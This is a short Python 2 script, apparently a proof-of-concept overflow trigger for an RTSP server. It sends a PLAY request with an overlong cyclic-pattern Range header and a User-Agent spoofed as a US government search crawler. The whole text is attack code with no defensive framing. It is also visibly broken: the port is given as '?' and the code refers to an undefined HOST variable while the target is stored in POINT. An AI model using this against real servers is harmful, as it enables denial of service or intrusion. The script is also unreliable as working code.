import socket
 
POINT = 'HERE'
PORT = ?             
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((POINT, PORT))
 
trigger_pkt =  "PLAY rtsp://%s/ RTSP/1.0\r\n" % HOST
trigger_pkt += "CSeq: 7\r\n"
trigger_pkt += "Range: npt=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9aLSaLSaLS\r\n"
trigger_pkt += "User-Agent: irstGov.gov Search - POC:firstgov.webmasters@gsa.gov \r\n\r\n"
 
s.sendall(trigger_pkt)
print "Packet sent"
data = s.recv(1024)
print 'Received', repr(data), "\r\n"
s.close()  
